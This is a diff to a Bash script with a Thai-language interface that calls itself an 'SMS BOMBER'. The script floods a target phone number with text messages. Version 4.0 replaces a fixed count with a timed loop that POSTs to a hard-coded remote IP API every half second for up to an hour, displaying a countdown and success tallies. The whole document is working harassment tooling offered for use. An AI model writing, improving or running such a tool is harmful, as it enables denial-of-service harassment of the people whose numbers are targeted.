@@ -16,7 +16,7 @@
 # ═══════════════════════════════════════════════════════════════════════════════
 
 API_URL="${SMS_API_URL:-http://141.98.17.37:3000}"
-VERSION="3.2"
+VERSION="4.0"
 REPO="https://raw.githubusercontent.com/kw3765515-ctrl/smsvip/main"
 
 # ─── Colors & Styles ──────────────────────────────────────────────────────────
@@ -177,24 +177,25 @@ input_phone() {
     done
 }
 
-input_count() {
+input_duration() {
     echo ""
     print_line "─" "$CYN"
-    echo -e "${BWHT}  🔢 ขั้นตอนที่ 2: ระบุจำนวน${NC}"
+    echo -e "${BWHT}  ⏱️  ขั้นตอนที่ 2: ระบุเวลา${NC}"
     print_line "─" "$CYN"
     echo ""
-    echo -e "  ${GRY}แนะนำ: 10-100 ครั้ง (ค่าที่เหมาะสม)${NC}"
+    echo -e "  ${GRY}ระบุเป็นนาที เช่น: 1 = ยิง 1 นาที${NC}"
+    echo -e "  ${GRY}แนะนำ: 1-10 นาที${NC}"
     echo ""
     
     while true; do
-        echo -ne "  ${CYN}➤ จำนวนครั้ง: ${NC}${BWHT}"
-        read count
+        echo -ne "  ${CYN}➤ ระยะเวลา (นาที): ${NC}${BWHT}"
+        read duration
         echo -ne "${NC}"
         
-        if [[ "$count" =~ ^[0-9]+$ ]] && [ "$count" -ge 1 ] && [ "$count" -le 100 ]; then
+        if [[ "$duration" =~ ^[0-9]+$ ]] && [ "$duration" -ge 1 ] && [ "$duration" -le 60 ]; then
             break
         else
-            echo -e "  ${BRED}✗ จำนวนไม่ถูกต้อง กรุณาใส่ตัวเลข 1-100${NC}"
+            echo -e "  ${BRED}✗ กรุณาใส่ตัวเลข 1-60 นาที${NC}"
             echo ""
         fi
     done
@@ -209,7 +210,7 @@ confirm_attack() {
     echo ""
     echo -e "  ${WHT}┌─────────────────────────────────────────┐${NC}"
     echo -e "  ${WHT}│${NC}  📱 เป้าหมาย: ${BWHT}${phone}${NC}"
-    echo -e "  ${WHT}│${NC}  🔢 จำนวน: ${BWHT}${count}${NC} ครั้ง"
+    echo -e "  ${WHT}│${NC}  ⏱️  ระยะเวลา: ${BWHT}${duration}${NC} นาที"
     echo -e "  ${WHT}│${NC}  🌐 ผ่าน: ${GRY}API${NC}"
     echo -e "  ${WHT}└─────────────────────────────────────────┘${NC}"
     echo ""
@@ -272,68 +273,89 @@ check_and_update() {
 }
 
 # ─── Send SMS via API ─────────────────────────────────────────────────────────
-# ยิงครั้งเดียว ตามจำนวนที่ผู้ใช้ระบุ
+# ยิงตามเวลาที่ผู้ใช้ระบุ (นาที)
 send_sms_api() {
     local phone=$1
-    local count=$2
+    local duration_minutes=$2
+    
+    # คำนวณเวลาสิ้นสุด (นาที -> วินาที)
+    local duration_seconds=$((duration_minutes * 60))
+    
+    SUCCESS_COUNT=0
+    FAIL_COUNT=0
     
     echo ""
     print_line "=" "$MGN"
-    echo -e "${BMGN}  🚀 กำลังยิง SMS ${count} ครั้ง...${NC}"
+    echo -e "${BMGN}  🚀 กำลังยิง SMS เป็นเวลา ${duration_minutes} นาที...${NC}"
     print_line "=" "$MGN"
     echo ""
     
     echo -e "  ${CYN}📱 เบอร์:${NC} ${BWHT}${phone}${NC}"
-    echo -e "  ${CYN}🔢 จำนวน:${NC} ${BWHT}${count}${NC} ครั้ง"
+    echo -e "  ${CYN}⏱️  ระยะเวลา:${NC} ${BWHT}${duration_minutes}${NC} นาที"
     echo ""
     
-    # ส่งครั้งเดียวเลย ไม่ต้องวนลูป
-    echo -e "  ${YLW}⏳ กำลังส่ง...${NC}"
+    # เริ่มจับเวลา
+    SECONDS=0
     
-    response=$(curl -s -X POST "${API_URL}/send" \
-        -H "Content-Type: application/json" \
-        -d "{\"phone\":\"$phone\",\"count\":${count}}" \
-        --max-time 60 2>/dev/null)
-    
+    echo -e "  ${YLW}⏳ เริ่มยิง...${NC}"
     echo ""
     
-    # ตรวจสอบผลลัพธ์
-    if echo "$response" | grep -q '"success":true'; then
-        echo -e "  ${LGRN}✓ ส่งคำขอสำเร็จ!${NC}"
-        echo -e "  ${GRY}  API กำลังประมวลผล ${count} ครั้ง...${NC}"
-        SUCCESS_COUNT=$count
-        FAIL_COUNT=0
-    else
-        echo -e "  ${LRED}✗ ส่งคำขอล้มเหลว${NC}"
-        SUCCESS_COUNT=0
-        FAIL_COUNT=$count
-    fi
+    # ยิงซ้ำไปเรื่อยๆ จนกว่าจะครบเวลา
+    while [ $SECONDS -lt $duration_seconds ]; do
+        local elapsed=$SECONDS
+        local remaining=$((duration_seconds - elapsed))
+        local minutes=$((remaining / 60))
+        local seconds=$((remaining % 60))
+        
+        # แสดงเวลานับถอยหลัง
+        printf "\r  ${CYN}▶${NC} เวลาที่เหลือ: ${BWHT}%02d:%02d${NC} | ${LGRN}✓ %d${NC} | ${LRED}✗ %d${NC}" "$minutes" "$seconds" "$SUCCESS_COUNT" "$FAIL_COUNT"
+        
+        # ยิง SMS (เรียก API)
+        response=$(curl -s -X POST "${API_URL}/send" \
+            -H "Content-Type: application/json" \
+            -d "{\"phone\":\"$phone\",\"count\":1}" \
+            --max-time 10 2>/dev/null)
+        
+        if echo "$response" | grep -q '"success":true'; then
+            ((SUCCESS_COUNT++))
+        else
+            ((FAIL_COUNT++))
+        fi
+        
+        # หน่วงเวลาเล็กน้อย (0.5 วินาที)
+        sleep 0.5
+    done
     
+    echo ""
+    echo ""
+    echo -e "  ${LGRN}✓ ครบเวลา ${duration_minutes} นาทีแล้ว!${NC}"
     echo ""
 }
 
 # ─── Show Results ─────────────────────────────────────────────────────────────
 show_results() {
     local phone=$1
-    local count=$2
+    local duration=$2
     local success=$3
     local failed=$4
+    local total=$((success + failed))
     
     print_line "=" "$MGN"
     echo -e "${BMGN}  📊 สรุปผลการดำเนินการ${NC}"
     print_line "=" "$MGN"
     echo ""
     echo -e "  ${WHT}╔══════════════════════════════════════════════════════════╗${NC}"
-    printf "  ${WHT}║${NC}  📱 เป้าหมาย:     ${BWHT}%-40s${WHT}║${NC}\n" "$phone"
-    printf "  ${WHT}║${NC}  📨 จำนวนทั้งหมด: ${BWHT}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$count" ""
-    printf "  ${WHT}║${NC}  ${LGRN}✓ สำเร็จ:${NC}        ${LGRN}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$success" ""
-    printf "  ${WHT}║${NC}  ${LRED}✗ ล้มเหลว:${NC}       ${LRED}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$failed" ""
+    printf "  ${WHT}║${NC}  📱 เป้าหมาย:      ${BWHT}%-39s${WHT}║${NC}\n" "$phone"
+    printf "  ${WHT}║${NC}  ⏱️  ระยะเวลา:     ${BWHT}%-3d นาที%-35s${WHT}║${NC}\n" "$duration" ""
+    printf "  ${WHT}║${NC}  📨 จำนวนที่ยิง:   ${BWHT}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$total" ""
+    printf "  ${WHT}║${NC}  ${LGRN}✓ สำเร็จ:${NC}         ${LGRN}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$success" ""
+    printf "  ${WHT}║${NC}  ${LRED}✗ ล้มเหลว:${NC}        ${LRED}%-3d ครั้ง%-33s${WHT}║${NC}\n" "$failed" ""
     echo -e "  ${WHT}╚══════════════════════════════════════════════════════════╝${NC}"
     echo ""
     
-    if [ "${success:-0}" -eq "$count" ]; then
+    if [ $failed -eq 0 ] && [ $success -gt 0 ]; then
         echo -e "  ${LGRN}🎉 ยิงสำเร็จทั้งหมด!${NC}"
-    elif [ "${success:-0}" -gt 0 ]; then
+    elif [ $success -gt 0 ]; then
         echo -e "  ${YLW}⚡ ยิงสำเร็จบางส่วน${NC}"
     else
         echo -e "  ${BRED}💥 ยิงไม่สำเร็จเลย${NC}"
@@ -343,7 +365,7 @@ show_results() {
 # ─── Quick Mode ───────────────────────────────────────────────────────────────
 quick_mode() {
     local phone=$1
-    local count=$2
+    local duration=$2
     
     check_deps
     check_api
@@ -354,19 +376,19 @@ quick_mode() {
         exit 1
     fi
     
-    if [[ ! "$count" =~ ^[0-9]+$ ]] || [ "$count" -lt 1 ] || [ "$count" -gt 100 ]; then
-        echo -e "${BRED}✗ จำนวนไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-100${NC}"
+    if [[ ! "$duration" =~ ^[0-9]+$ ]] || [ "$duration" -lt 1 ] || [ "$duration" -gt 60 ]; then
+        echo -e "${BRED}✗ เวลาไม่ถูกต้อง! ต้องอยู่ระหว่าง 1-60 นาที${NC}"
         exit 1
     fi
     
     show_banner
     
     echo -e "  ${CYN}📱 เป้าหมาย:${NC} ${BWHT}$phone${NC}"
-    echo -e "  ${CYN}🔢 จำนวน:${NC} ${BWHT}$count${NC} ครั้ง"
+    echo -e "  ${CYN}⏱️  เวลา:${NC} ${BWHT}$duration${NC} นาที"
     echo ""
     
-    send_sms_api "$phone" "$count"
-    show_results "$phone" "$count" $SUCCESS_COUNT $FAIL_COUNT
+    send_sms_api "$phone" "$duration"
+    show_results "$phone" "$duration" $SUCCESS_COUNT $FAIL_COUNT
 }
 
 # ─── Interactive Mode ─────────────────────────────────────────────────────────
@@ -385,11 +407,11 @@ interactive_mode() {
     check_api
     
     input_phone
-    input_count
+    input_duration
     confirm_attack
     
-    send_sms_api "$phone" "$count"
-    show_results "$phone" "$count" $SUCCESS_COUNT $FAIL_COUNT
+    send_sms_api "$phone" "$duration"
+    show_results "$phone" "$duration" $SUCCESS_COUNT $FAIL_COUNT
     
     echo ""
     echo -e "  ${CYN}🙏 ขอบคุณที่ใช้บริการ${NC} ${BWHT}SMS BOMBER${NC}"
@@ -406,8 +428,8 @@ show_help() {
     echo -e "    ${GRY}$0${NC}"
     echo ""
     echo -e "  ${CYN}• โหมดเร็ว (ผ่าน Arguments):${NC}"
-    echo -e "    ${GRY}$0 <เบอร์> <จำนวน>${NC}"
-    echo -e "    ${GRY}$0 0812345678 10${NC}"
+    echo -e "    ${GRY}$0 <เบอร์> <นาที>${NC}"
+    echo -e "    ${GRY}$0 0812345678 5${NC}  ${DIM}(ยิง 5 นาที)${NC}"
     echo ""
     echo -e "  ${CYN}• เปลี่ยน API:${NC}"
     echo -e "    ${GRY}SMS_API_URL=http://localhost:3000 $0${NC}"
